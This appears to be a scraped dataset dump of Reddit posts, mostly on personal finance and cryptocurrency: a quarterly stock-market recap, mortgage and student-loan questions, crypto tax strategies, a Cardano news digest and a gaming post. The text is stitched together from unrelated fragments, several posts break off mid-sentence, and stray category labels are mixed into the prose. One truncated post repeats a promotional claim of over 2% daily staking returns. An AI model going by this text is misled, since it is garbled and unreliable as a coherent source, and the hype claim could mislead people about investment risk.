&gt; Despite the tumultuous headlines and market volatility along with the frustrating churn in the market lately, US equities are finishing off the quarter well. Stocks in the S&amp;P 500 are up an average of 11.9% so far this year and grouped by sector they're all averaging gains. Leading the way higher, stocks in the Energy sector stand apart from every other sector with an average gain of over 20%. After Energy, stocks in the Financials and Consumer Discretionary sectors are both up an average of over 15%. On the other side of the chart, sectors underperforming are generally defensive in nature with Health Care and Utilities both averaging YTD gains of less than 5%. One notable underperforming sector given its size is Technology. With an average gain of 7.2% YTD, stocks in the Technology sector are underperforming the broader market by more than 4.5 percentage points.

&gt; Given the underperformance of Technology YTD, we can't help but remember some market 'certainties' over the years that never quite came to fruition. Remember after the initial surge off the lows coming out of the Credit Crisis in 2008 and 2009? While Financials were the best performing sector coming off the lows, the rally in the sector ran out of steam and stalled out. All we kept hearing at the time was that 'the market couldn't rally without the Financials', but rally it did. Now, after Technology outperformed during COVID and through last Summer, the sector has stalled out, and we're hearing the same phrase now as we did back then with the only difference being that Technology has replaced Financials as the sector that the market couldn't rally without. Since September 2nd though, when we first started to see the 'Big Shift' in the market, the S&amp;P 500 has nearly tripled the return of the Technology sector, and despite Tech's underperformance, the S&amp;P 500 has still managed double-digit percentage gains. When it comes to the old conventional wisdom of the market, investors would be best served by doing the opposite of Timothy Leary by 'turning off' and 'tuning out' all the noise.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://media.bespokepremium.com/uploads/2021/03/avgsectors.png))**

&gt; In the tables below, we list the top and bottom twenty performing S&amp;P 500 stocks so far this year. Starting with the winners, L Brands (LB) and Marathon (MRO) are both already up over 60%, while another five stocks have rallied 50%+. With the exception of HollyFrontier (HFC), which is up 39.9%, every other one of the top 20 stocks is up over 40% - in just three months! What's most notable about this table, though, isn't what's on it, but what isn't. Technology has a larger number of components in the S&amp;P 500 than any other sector, but only one stock from the sector - Applied Materials (AMAT) - made the list of top performers, and only one other besides AMAT (Hewlett Packard Enterprise) made the top 50.

&gt; At the other end of the spectrum, there are only 13 stocks in the S&amp;P 500 that are down over 10% YTD, and the 20th worst-performing stock is down less than 9%. And while there was only little representation from the Technology sector on the list of biggest YTD winners above, there's no shortage on the list of losers with eight of the twenty coming from that sector. It's only been three months, but stretching back to early last September, the market has gotten along just fine without the help of Technology.

&gt; # Are the Financials and Energy Sectors Due for Rotation?

&gt; As we noted in today's Morning Lineup and an earlier post, the Energy sector far and away has been the best performing S&amp;P 500 sector in Q1. The sector is on pace to close out the quarter with a gain of just under 30%. That is nearly double the return of the next best performing sector: Financials. Granted, Financials have likewise been on an impressive run, gaining over 15%.

&gt; As shown in the charts below, going back to at least 1990, Q1 of 2021 is on pace to go down as the Energy sector's single largest quarterly gain on record. Amazingly, the next two quarters that stand as runners-up have both come within the past year. Those were last quarter when the sector rose 25.78% and Q2 of 2020 when it rallied 28.68%. For the Financial sector, this quarter's gain stands in the top decile of all quarterly moves of the past three decades, and that follows last quarter's 22.52% gain which stands in the top 5%. As shown in the charts below, for both sectors, gains of 15% or more in a single quarter have been fairly uncommon with only a handful of past instances.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://media.bespokepremium.com/uploads/2021/03/033121-Bars-Sectors2.png))**

&gt; That brings to question if strong runs in one quarter result in rotation out of those sectors the following quarter. In the tables below, we show the performance of the Financials and Energy sectors from the end of quarters with gains of 15% or more. Starting with a look at Financials, that rotation has not necessarily always occurred as the sector has consistently risen over the following three months. Of the ten prior instances, there have only been two quarters, Q3 2009 and Q1 2012, in which Financials were lower by the end of the next quarter. Those were also some of the few times that Financials were lower at the end of the first and second month of the quarter. We would note, though, that the current instance is also the first time since 2009 that there have been back-to-back quarters that the sector has seen gains of 15% or more. Back during that last occurrence (Q3 2009), returns were in fact weaker after that second quarter of large gains.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://media.bespokepremium.com/uploads/2021/03/033121-Fin-2a.png))**

&gt; As for the Energy sector, of the nine prior instances where the sector rallied over 15%, this was the first time with two sequential quarters boasting 15% or larger gains. Additionally, rotation out of Energy stocks has been far more commonplace. As shown in the table below, from the conclusion of those quarters with big gains, the sector has averaged a decline throughout the next quarter.

&gt; # Stocks and Inflation

&gt; As we continue LPL Research’s Inflation Week, today we will examine how stocks have historically done at different inflation levels. For more color on our views on inflation, please read here and here, and look out for tomorrow’s blog, where we’ll examine some of the factors that have kept inflation low and that will likely continue to put a lid on inflation in the future.

&gt; Looking at S&amp;P 500 Index returns going back to 1950, stocks have tended to like low inflation. As shown below, the lower inflation is, the better the S&amp;P 500 Index returns tend to be, although the strong performance for negative inflation may be due to markets rebounding off of lows. Taking it a step further, if inflation is trending lower, then stocks do much better (18.8% on average) versus if inflation is trending higher (6.4% on average).

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i1.wp.com/lplresearch.com/wp-content/uploads/2021/03/3.31.21-Blog-Chart-4.png?ssl=1))**

&gt; “You can’t argue with history, as it sure appears that inflation that’s under control is a tailwind for stocks,” explained LPL Chief Market Strategist Ryan Detrick. “It is when inflation starts to turn higher that it can knock stocks down. Given our base case is for modest inflation, this is another feather in the cap for the bulls.”

&gt; Looking at a scatter plot of inflation and the S&amp;P 500, there is a fairly wide dispersion in some cases, so this is by no means a perfect indicator. Still, the regression line moves from the upper left to the lower right, suggesting lower inflation indeed historically has benefitted stocks more than higher inflation.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i2.wp.com/lplresearch.com/wp-content/uploads/2021/03/3.31.21-Blog-Chart-5.png?ssl=1))**

&gt; The inflation question is one that isn’t going away, especially as the US continues to add more fiscal and monetary stimulus. Although this isn’t a very consensus call, we think inflation will be capped once we get past 2021 and this should help stocks overall.

What are you all watching for in this upcoming trading week?

I hope you all have a wonderful weekend and a great week ahead r/stocks.",finance
gaming,Always get tilted in games,"I'm a very ambitious person in games. That's probably why I always get tilted in games, when something stupid happens. For instance, when a weapon is broken in a FPS game and it doesn't get nerfed/fixed and then, I die to it a several times for I don't get the weapon myself. I know it's    just a game but somehow I always manage to become tilted. 

I like the games I play but sometimes something doesn't go as expected and I rage, but I don't quit.

Does anyone knows a fix for this? Like a mentality to have while gaming.",technology
altcoin,About Savix automated gas-free staking,"To set some buying and holding incentives kick-starting the ecosystem early investors are rewarded with daily interest rates of more than 2% within the first days after the staking starts. If you start with an investment of 100 Savix (SVX) you acquire before the staking mechanism is activated (directly after Uniswap trading has begun)

personalfinance,I don't understand the numbers given to me by mortgage banker. I do not want to be taken advantage of. Can anyone help explain this?,"Info:

Total cost: 180k

Down payment: 30k - (closing\_costs+fees) = \~16k

Local lender rate: 3.5%

Loan APR: 3.741

Monthly cost (before applying insurances): 746.54

&amp;#x200B;

What is confusing me about this is that the rate of 3.5% is high comparatively, but when I look at what other lenders will offer me with the information I entered above, they offer a rate of \~3-3.3% with higher monthly costs (in the $790 range).

&amp;#x200B;

Where is the disconnect in my understanding? How can a lower interest rate mean a higher estimated monthly payment? I'm clearly missing a variable.",finance
personalfinance,Estate tax with joint revocable trust,"So I understand that if you die and leave money to your spouse, that amount is not subject to the estate tax because of the marital deduction. (I'm thinking of state taxes here, I know the federal limit is quite high.) I just want to understand how it works if the spouses have set up a joint revocable trust. If you leave money through your will or POD/TOD accounts to the trust, does that also get the marital deduction, or does the trust not count as your spouse? And what about if you put your assets into the trust during your life - does that affect things any differently?",finance
personalfinance,Refinance Fiancée's Student Loans,"I am getting married in August. My Fiancée is graduating in May, starts her job in June, and has a significant student loan balance. I am currently banking with Navy Federal Credit Union, but she can't have an account until we are married. All of her loans are private. I am interested in refinancing her loans with Navy Fed. I have a high 700s credit score with about 7 years of credit history and she has mid 700s but a very short history. 

Some of my questions (I'm sure there are more that I'm not thinking of):

Should we try to refinance them now as opposed to after the wedding, or wait? 
Either way, should I try to put them under her name and my name or just co-sign for her?
Are there tax implications that should be swaying my decision?
Any other advice?",finance
Bitcoin,Are crypto interest sites hiding anything?,"Take crypto.com for example. If I’m told I can get 6% interest on my btc, what are the limitations? If I put in 0.25BTC, do I get the 6% earned regardless of it BTC/USD drops or rises? Aside from the very obvious downside of not holding your own Bitcoin, it seems very simple and pretty amazing, but surely there’s something I’m missing?

I did just notice that on blockfi, high interest rates only apply to amounts under 1BTC. I can’t see anything about a cap on crypto.com but I may not be looking at the right page.",cryptocurrency
personalfinance,Mortgage Question: Are discount points on a loan negotiable?,"Some loan estimates have ""discount points"" as an option and my question is; 

are discount point percentages negotiable? Could a different lender offer a lower point cost for the same decrease in interest rate? Do loan officers have an incentive to markup the points?

Example:  
$378k loan  
3.00% Interest Rate costs 1.488% (""discount points"")  
(Par = 3.25%)

How to think about extra monthly vs saved interest?","I have an interesting situation where I'm looking at two options for a mortgage on an owner-occupy investment property, and I'm trying to evaluate the opportunity cost of a shorter term or discount points against alternative investment uses.

Principal: $236,000

Loan | Loan 1 | Loan 2
---------|----------|----------
Interest Rate | 2.75% | 2.5% 
Term | 30yr | 20yr
Monthly | $881 | $1144
Lifetime | $346,842 | $300,137
*Discount Rate* | *2.125%* | *1.875%*
*Discount Lifetime* | $319,366 | $283,191

The way I'm seeing it, that extra $250 paid monthly on a 20yr term will save over $40,000 of the life of the 20 year loan (lifetime of loan $300k vs $347k). With $72,000 extra paid over 20 years, I see that as a 4.5% return on my $250/mo. Am I looking at this the wrong way? 

Additionally, for 3 discount points ($7080), I could lower either loan by 0.625%. It seems as though this discount equates to about a 4.5% return over the lives of the loans as well. Basically, it's not a high return, but it could be seen as locking in a safe investment for the future. 

I understand all these investments go out the window if the house were sold before the 20 year mark, but assuming this is a long term investment (a duplex with high rentability).

Conclusion: 

 - Am I thinking about the advantages of a shorter loan term in the right way in relation to opportunity cost of extra payments?
 - Opportunity cost of investing in loan points?
 - Is there a world where discount points or a shorter loan term has a better payoff?
 - Should I do both if I'm happy with a safe 4.5% return on a portion of my investments?",finance

Bitcoin,Some friendly tips and suggestions for getting out of poverty so you can buy more bitcoin,"It’s hard to start from nothing and turn your financial well being around-but it isn’t impossible. If you want to stack as many sats as you can, here are some friendly tips:

Put off that new iPhone, car, PlayStation, 👜, whatever.

Rent somewhere cheaper (if it’s safe, don’t sacrifice your safety for money).

Eat more vegetables and less meat (cheaper and better for you and the environment)

Switch your phone plan to a non premium carrier without unlimited data. Use more WiFi.

Cut your auto insurance rate if you have a car by shopping around or reducing the miles you drive or both.

Buy no random stuff. Only buy things you can express a true need for.

Make your food at home, stop buying food out and use only the necessary ingredients. Rice is cheap and so are oats, beans, eggs/egg whites and veggies.

Make sure you’re only carrying one tv streaming service.

Get out of credit card debt completely (interest rate is too high) and if you can’t control credit card spending, put limits on your card. Consider a balance transfer to a 0% apr card if you have too much debt to pay off.

If you have not gone to college, advance your education at a local community college. Don’t do this until you are ready to work your hardest to get good grades. You can’t unfuck your transcript, so treat it carefully.

If you don’t like school, pursue a trade like plumbing or electricians
 apprentice or general contracting/carpentry. 

Get in shape! Health care is expensive and the less you need to use it, the better. 

If you don’t have enough money to invest in bitcoin, bitcoin will not solve everything for you. But you can find other ways of escaping poverty if you truly focus, live frugally, and take it one day at a time. You can do this 💯",cryptocurrency

So with that said it was clear that I would get severance once I returned all the equipment.

It was clear this was not expected and they didn't even think I was actually correct at first but I pushed them to take back their gear.

So I send everything back but because they didn't expect the extra gear I couldn't use the company number at FedEx. I needed to pack it myself.

personalfinance,Pay student loans or keep saving?,"Advice please. I'm 37, live alone, no kids. This Fall, I started a new job at ~70k, up from 53k. My former role ended because of COVID. I was lucky to get this job. I'm in a field hit hard by the pandemic, where it takes forever to advance, and a Masters is required. 

This is the first time I've been able to have more than a few hundred in savings. *I'm now up to 10k in savings.* I'm working from home still, and my federal loans are on pause until September. 

Here's some more stats:

• $2,140 in a private student loan 

• $64,000 in a federal student loan

• $7,000 in car left

•$10,000 sitting in savings account (never touch it)

• No credit cards, currently renting

• Moving in five months when office goes in person

• Do consulting work on the side but it's inconsistent

• Plan to raise income 15-30% in the next five years

• Not interested in getting a roommate, no partner

I've read about avalanche versus snowball approaches to debt, not sure what's best. To be honest, I'm still nervous after my last role was cut because of COVID. That 10k in savings makes me feel secure. I'm putting $740 into savings a month.

What do you think I should do:

Throw some of the savings at one of the expenses? Which one? 

Keep the savings there, but stop putting that money toward it and now put it toward one of the debts? 

Make payments on my federal loans even when not required to decrease interest? 

Continue to save money at the rate I am and only start paying the loans when they go into repayment?

Do something else? Thoughts on why?

CryptoCurrency,"Cashing out to pay taxes. What are some of the strategies you could use, and which one will you be using?","So its time for yet another post about tax.  This one will be particularly timely if have a 31 March tax balance date.  If not, then many will either have a 30 June tax date, or a 31 December date.  In any case this issue becomes relevant at some point!

The issue is that most crypto holders (especially traders or those earning passive income) will have a considerable tax liability.  In some countries like New Zealand, that tax is paid in instalments through the year, even though you might not know your actual tax liability for some time.  Personally I am still waiting for decent defi tax solutions so its all back of the envelope stuff.

So one has to decide whether you are going to take some crypto of the table now, or otherwise have some way to fund your tax liability.  The risk of course is that you hold everything going forward, and then the entire market has a blackswan event, but you still owe tax on your previous gains.

So here are some of the ideas or options that you could think about (or some combination of them all).

1) Do nothing.  By far the most risky, but on the other hand if the market keeps going up, you then have additional funds to pay that tax.

2) Cash out the tax liability.  This is the obvious move, but then what do you do with the funds over the next year?  This might work a bit better if you have a mortgage or overdraft account, or other debts to repay.  Perhaps you could invest into a conservative fund, but either way your gains are going to be very very low.

3) Convert to stable coins and wait.  This option is very interesting when you consider you can use stable coins in lending products like FTX for huge interest rates.  The downside is if you don’t live in the USA, you take a risk on FTX rates.  You could also change tack and buy any extreme dips IF you want to put your tax money at risk.

4) Passive income from Defi / Cefi.  As (3) above, but using products like Celsius or LP pools to generate income, that hopefully might pay for a large portion of your tax.  Definite risk here, but for defi you could consider some of the more stable pools – for example, ones with stable coin pairings.  The idea here is that at least when you pay your taxes, you’ll be able to keep the passive income.

5) Hold onto the next short term bull run and then cash out.  As (1) above, but waiting for the next surge in price.  This is course assumes there will be one and we aren’t at a local top (after all, 60k is proving awfully hard to breach).

6) Use a defi lending protocol to stake your ETH, and borrow stable coins – cash out the stable coins to pay your taxes.  Again the risk here is that ETH crashes in value, plus you have interest to pay.

These are just some of the ideas I have.  At this point I am thinking of reducing my trading or risky positions, and moving them into more conservative defi products, with the passive income moved into stable coins (and lent on FTX) until I have enough to pay the first tax instalment.  Let me know what you are all thinking!",cryptocurrency

personalfinance,20% down payment vs. 5% or 10% down payment + taxable investment account (ETFs/mutual funds mainly),"I am purchasing a property soon for around 425k. I'm also selling my existing property and expect to clear anywhere from 130-&gt;140k in profit. Originally, I had planned on using 85k from that profit for 20% down on my new home, but with interest rates still low perhaps I should just open an individual investment account and maybe only put 5% or 10% down?

I am already maxing my Roth IRA and 401k so that's not an issue. I'm trying to determine whether it's worth it to put less than 20% down when PMI will be present, and when I'd have to pay capital gains taxes (long-term for 1 year?). I was just intending to put like 95% of my investment account holdings into  standard ETF/Mutual funds and 5% for individual investments. I shouldn't need to withdraw money for at least a year from the investment account, probably even longer since I don't 'need' the money given I have an emergency fund in place.

Is it possible to arrange not having to pay PMI with a 10% or 15% down payment? Are there difference in interest rates for a 5% down, 10% down, or 20% down, etc.?",finance

personalfinance,Check my math on mortgage vs. investment,"I have enough money to pay off my mortgage. I am trying to analyze some investment scenarios to decide how to handle the money. In this post I am not asking for opinions on what I should do, but rather trying to make sure I am calculating this correctly.

For the sake of argument (made up numbers), say I have a mortgage with a balance of $500,000, an interest rate of 3%, and a marginal income tax rate of 35%. 

By my calculations, the interest payment at this point would be about $1250, but the tax deduction would reduce my income tax owed by about $438 ($1250 * 35%), so effectively I am paying about $813 in interest. In order to earn $813 in interest in one month on an investment of $500,000, I'd need an annual return of just under 2%.

Is this all correct so far? 

Should it follow that I could then hypothetically put the $500,000 in an account that bears 2% interest (for purposes of this question set aside investment risk, rate adjustments, etc.), autopay the mortgage from that account, and come out financially identical to just paying the whole thing off now? I.e. the investment return is enough to offset the interest I continue paying (any ROI above 2% is profit, and I gain the benefit of having access to that cash if life happens and I need it for something else).

Again to be clear I realize that real world scenarios are not that simple. Investment returns are not guaranteed and steady. Our income/tax rate may not be the same for the life of the loan. Tax code may change. And so on. I will factor all of that into my analysis, but I want to make sure I'm not fundamentally miscalculating it first.",finance

35. There is a Part 2 to the IOHK EUTXO discussion we reported under item 39.  Good read for verbally upstaging your ETH &amp; BTC supporting co-workers. Be the king of the post-zoom call crypto banter!

36. Commenter Report:  the “metamask of Cardano” speculated about previously in item 30 is the “Yoroi dApp connector”.  It’ll be rolled out “with Ergo first and Cardano once Plutus is released.” [https://github.com/Emurgo/yoroi-ergo-connector](https://github.com/Emurgo/yoroi-ergo-connector)
37. It looks like this Yoroi dApp Connector info has even been detailed by Sebastien and Rob on yt. Not sure if we can link directly to this video. But, here is the link to the link. Looks like the dApp Connector talk starts at 1:23:10.  [https://twitter.com/NicoArqueros/status/1353203943195734017](https://twitter.com/NicoArqueros/status/1353203943195734017)

42. We get another People of Input Output Global video.  This one features Dan Friedman. He currently lives in Japan.  But, the interview starts off with some very interesting stories about his youth in 1980s Kiev, Ukraine.  His speaking and story-telling style is similar to the captain in a 1990s buddy cop movie (in a good way). Very interesting and compelling guy.

49. Perceptions are shifting on which platform will be #1 for smart contracts over the next decade. Here’s the biggest crypto youtuber asking his co-host if he’s losing faith in the traditional #1. If you’re in Cardano, you can guess which coin his answer is shifting away from. [https://youtu.be/4jRCmdWva40?t=3270](https://youtu.be/4jRCmdWva40?t=3270)

52. The Crypto Time Traveler mentioned last week (Item 49) has apparently left us and now gone back to the future. It definitely adds a touch of realism when they actually leave. [https://twitter.com/CryptoTimeTrav2/status/1371492636884865029](https://twitter.com/CryptoTimeTrav2/status/1371492636884865029)
53. Charles delivered his pre-recorded keynote address at the Blockchain Africa Conference. His remarks support the rumor that the initial Ethiopia project will be around identity. He specifically mentioned Atala Prism. There was talk of the digital identity being able to be linked to wallets, payment systems, and property. He also reasserted that the deals on the table in Africa would bring “millions of users” into the Cardano ecosystem.  [https://www.youtube.com/watch?v=CGEs99I6qV8](https://www.youtube.com/watch?v=CGEs99I6qV8)
54. If you haven’t seen it in the past, the Atala Prism website has a demo that works with the mobile app showing how the identity solution (along with academic credentialing, health insurance, and proof of employment) would run on Cardano. [https://www.atalaprism.io/](https://www.atalaprism.io/)

56. Never imagined there would be a holiday light display that flashed “Screw Doge Coin; ADA is Best” to the original Doge music. Friendly rivalry is probably good in crypto. [https://www.youtube.com/watch?v=eM135pv72mY&amp;t=31s](https://www.youtube.com/watch?v=eM135pv72mY&amp;t=31s)
57. Charles doubles down on the declaration that Cardano’s defining moment will be when it can provide the rails for micro finance from the developed world to the developing world not as a form of charity but as a profitable financial activity for both lender and loan recipient. He thinks it will be the biggest transfer of wealth in the history of the world. He says the base infrastructure for this is being rolled out over the next 24-36 months. [https://www.youtube.com/watch?v=oMRGUCLQPYo](https://www.youtube.com/watch?v=oMRGUCLQPYo)

59. Max Keiser is also not romantically in love with us. Charles lays down the stick pretty hard on this one. I’m saying good. If you can’t take the heat...stay out of the Cardano kitchen, my man.

67. Cardano 360 going down on Thursday March 25th.  This is the big monthly streaming event where they tell us what’s going on. Save your spot here:  [https://www.crowdcast.io/e/cardano360-march/register](https://www.crowdcast.io/e/cardano360-march/register)
68. Critics think that lack of burned fees is a valid complaint against Cardano. But, good outcomes at scale only come with good incentives and free competition. So, if the fees aren’t paying the costs of transactions in these other protocols, the question goes begging: who is? In the end, the answer always turns out to be that the transaction costs have just been obfuscated under the guise of inflation via coin emission or some other hidden tax on someone in the ecosystem (usually the coin holders).  [https://twitter.com/avaxholder/status/1373336728010956801](https://twitter.com/avaxholder/status/1373336728010956801)
69. We are starting to see cracks in the psychological armor of the Ethereum crowd.  This anti-Cardano post was at 0 upvotes (at time of writing) while the fairly pro-Cardano response received triple figure upvotes. [https://www.reddit.com/r/ethereum/comments/maktuy/ist\_charles\_hoskinson\_the\_new\_justin\_sun/](https://www.reddit.com/r/ethereum/comments/maktuy/ist_charles_hoskinson_the_new_justin_sun/)
70. When smart contracts go live with Alonzo (the final HFC event in Goguen), and we eventually have Babel Fees, it’s going to make almost zero sense for any developer to choose ETH over Cardano. This will apply especially to any project that sends tokens to its customers (e.g. NFT projects) and any project that involves significant computation or transaction loads on the network (e.g. DeFi projects).
71. Emurgo is thinking about supply chain solutions for the seafood industry. [https://emurgo.io/blog/how-can-blockchain-deliver-benefits-to-the-seafood-industrys-supply-chain](https://emurgo.io/blog/how-can-blockchain-deliver-benefits-to-the-seafood-industrys-supply-chain)

74. A guy tried to use Charles’s reaction to the King Soopers tragedy in Boulder to criticize Cardano. Charles told him to go f\*\*\* himself and then auctioned off the tweet with proceeds going to the families of the victims. The auction quickly hit four figures and closed at $7k.  [https://v.cent.co/tweet/1374207862646304773?s=u\_a](https://v.cent.co/tweet/1374207862646304773?s=u_a)
75. Thursday is Cardano 360 and Friday will be “Get ADA Day” as staking rewards for Epoch 255 close. Gonna be an action packed close to the week.  Enjoy!

77. Great new interview with Sebastien! In this one he explains a lot about the dApp Connector being built by Emurgo. As reported by a commenter in one of our earlier threads, it will work with Ergo first and then Cardano. A very interesting tidbit was Sebastien’s explanation of how the Emurgo dApp Connector will actually be safer than Metamask (which fills a similar role in the ETH ecosystem).  Very good info. Thanks to Sebastien and the Cardano Podcast! [https://youtu.be/Dkw7hvFP6dY](https://youtu.be/Dkw7hvFP6dY)
78. Today is Cardano 360 day!!!!  Watch it here at 10:30AM Pacific, 17:30 GMT, 18:30 CET.  This is the live monthly streaming show from IOHK.  Watch this one. Hopefully we’ll get a target date for Alonzo.  That’ll tell us when we get smart contracts. [https://www.youtube.com/watch?v=uQt7AjimaAg](https://www.youtube.com/watch?v=uQt7AjimaAg)
79. Looks like the Cardano 360 show may highlight how Cardano will not experience some of the shortcomings that leading blockchains have in the past (like the time that bitcoin accidentally issued 184 billion BTC in one block).  [https://twitter.com/IOHK\_Charles/status/1374783084881608706](https://twitter.com/IOHK_Charles/status/1374783084881608706)
80. Catalyst Fund 5 will have a $2MM total budget! Included will be a very interesting $50k Metadata challenge in Fund 5.  Metadata can be used to prove the existence of a certain document or event to third parties without necessarily revealing the data contained therein. This means you can do cool things on the blockchain without using smart contracts as in the prior New Balance anti-counterfeiting and Beefchain traceability Cardano projects.The winners of this challenge are actually going to be incubated and supported by the IOHK Metadata team! People waiting for Goguen and smart contracts are definitely sleeping on what can be done with metadata on Cardano today.

82. Charles says they are going to end up spending $15-30MM this year on research and they will hire 100-200 people. That’s an investment in the future of the ecosystem! [https://www.youtube.com/watch?v=bLwyFADws8w](https://www.youtube.com/watch?v=bLwyFADws8w)
83. Cardano 360 was yesterday! The big news first: it sounds like the Alonzo (smart contracts)  testnet will launch around end of April or early May. It’s looking like Alonzo HFC event will happen on main net late July or August. The stream was over three hours long. They covered so much! Now, let’s get to the other details revealed. [https://www.youtube.com/watch?v=ULBLgPgxtN8](https://www.youtube.com/watch?v=ULBLgPgxtN8)
84. Grigory Rosu from Runtime Verification gave a big rundown on the universality in programming languages that will be provided by K framework in Cardano.  He said he should have some kind of proof of concept around six months from now.
85. Michael Peyton Jones and Manual Chakravarty (the architects of Plutus) talked about 1) the benefits of Cardano’s modern approach to designing Plutus TX and Plutus Core and how Plutus Core basically being lambda calculus allows for mathematical verification of software written in Plutus, 2) how UTXO (and EUTXO in Cardano) are much more battle proven than other ledger accounting systems like account balance system (e.g. ETH) which have had problems, 3) how non-fungible role tokens will be a thing, and 4) how they are now laying out a real development platform for builders instead of just throwing Plutus out into the world.
86. Lars Brünjes (Head of Education) laid out how they are going to train a group of developers through the Plutus Pioneers program.  That group will help test the Alonzo test net after it launches.
87. Lars has also cloned Uniswap in Plutus with a graphical user interface and completely automated value discovery in the liquidity pools.  He did this as a proof of concept to show the capabilities of Plutus. That was demoed right on the stream.
88. They then brought on people from three different Haskell development firms who will be building things on the testnet as a sort of “red team” test of Alonzo.  They all seemed to be very capable in terms of Haskell development (note here that Plutus is basically Haskell).
89. Tom Lindeman (Chief Security Officer at Runtime Verification) then laid out how disastrous the last few years in Ethereum have been for smart contract security.  But, Cardano has a solution.  IOHK and Runtime Verification will partner to certify smart contracts as to security.  Runtime Verification will do the security audits.  This program will be called “Alpha Frontier”.
90. Charles then laid out the details of the timeline for Alonzo as described above.   It sounds like they are targeting to be totally done and hit a code/feature freeze at the end of June.  But, it will take Coinbase, Kraken, Binance et al. at least four weeks to update their systems before they can actually launch smart contracts on mainnet.
91. Collin Edwards and Duncan Couts then gave us an update on the stake pool world as we approach “D DAy” or d=0 which is full decentralization of block production. A stake pool operator Shawn McMurdo has made some Cardano Improvement proposals as to 1) a non-linear curved basis for a0 (pronounced a-naught, represents stake pool operator pledge) to affect rewards more greatly, 2) non-centralized rankings in Daedalus, and 3) an adjustment to minimum fees from fixed to variable.   Collin and Duncan clarified there will be no changes to a0 (pledge) or k (max pool size) at the d=0 (full decentralization) event coming up. Duncan also laid out how they are going to launch P2P node testnet in early Q2.  This will allow for information to flow directly between nodes and will accomplish automation of things like peer discovery that are currently manual on the network.
92. Dor Garbash then gave an update on Catalyst.  As covered previously here, Catalyst has become a monster.  There are 17k people in Ideascale and the treasury is worth more than $400MM.  You heard that right, almost a half billion dollars in the Catalyst Treasury.  We also heard from a bunch of the previous catalyst winners.
93. Someone paid $23k for the notorious “Your telling the CEO of IOHK…” tweet.  [https://v.cent.co/tweet/1374769078519300097?s=u\_a](https://v.cent.co/tweet/1374769078519300097?s=u_a)
94. IOHK is rolling out a new team that will fight the scammers in crypto. In my mind this involves guys in polo shirts with popped collars and Ledger Nano Xs around their necks carrying [these](https://www.heckler-koch.com/en/products/military/submachine-guns/mp7a1/mp7a2/overview.html) and hunting the bad guys while ‘90s action movie music plays. Probably Dwayne Johnson is their commander. Maybe that’s not what Charles has in mind.  [https://twitter.com/IOHK\_Charles/status/1375473873651568640](https://twitter.com/IOHK_Charles/status/1375473873651568640)
95. Cardano is the Tesla of crypto. We’re just in that early stage right before the Model 3 launch where the Ford and GM guys are at peak fear/peak shit talking but we haven’t made that big move yet.  “It’s an illusion, they’ll never release a sub $40k car.”  We’ll see shortly, gentlemen...we’ll see.
96. Every once in a while I like to take stock of where the rest of the crypto space is on Cardano. So, let’s do a little review of what a few of the larger youtube crypto and other influencers are saying about Cardano right now.
97. Charles says they are actually going to hire investigators for the IOG anti-scammer team.  People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon.  Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
98. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul.  Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds.   [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
99. We hit 100% decentralization of block production tomorrow.  Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
100. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days.  Enjoy it guys!!!
101. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
102. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
103. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem.  To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
104. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the  transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”.  When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase.  The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
105. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed in the secondary market for Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now.

Have about \~$100k in liquid assets. Retirement is on track and 401k is fully funded each year. I'm in a good spot financially, all things considered. 

Homes in my city, like most of America, are crazy expensive. 3B/Ba 2000sqft townhomes that would have priced at $800k last year are regularly selling for $1M+, and with interest rates projected to remain low until 2023, I don't see that trend reversing. I currently live in an expensive high rise and am sick of throwing away $4k / month on rent. Plus, I work from home and would like more space and a place to call my own.

The idea of buying a $1M house seems crazy to me, but online mortgage calculators tell me I should be able to easily afford the monthly payments, esp if I get a 7/1 ARM. My limiting factor is the down payment, I only have enough for maybe 10% down and would need PMI. But with rates so low, it almost seems better to put down less anyway.

Im comparing fixed vs variable rate loans and im getting confused on the calculation for Fixed rate. 

Everyone uses the formula PMT in excel to determine the amount to be paid each month ( interest + capital) yet im confused about the math behind it. Every example I have seen works by calculating the interest to be paid and then subtracting that from the total to be paid that month in order to obtain the capital needed to be paid.  ( see example below)

Month payment = interest + capital 

Steps 1 : Interest =  interest rate x Debt outstanding

Step 2 : Capital =  Month payment - interest rate

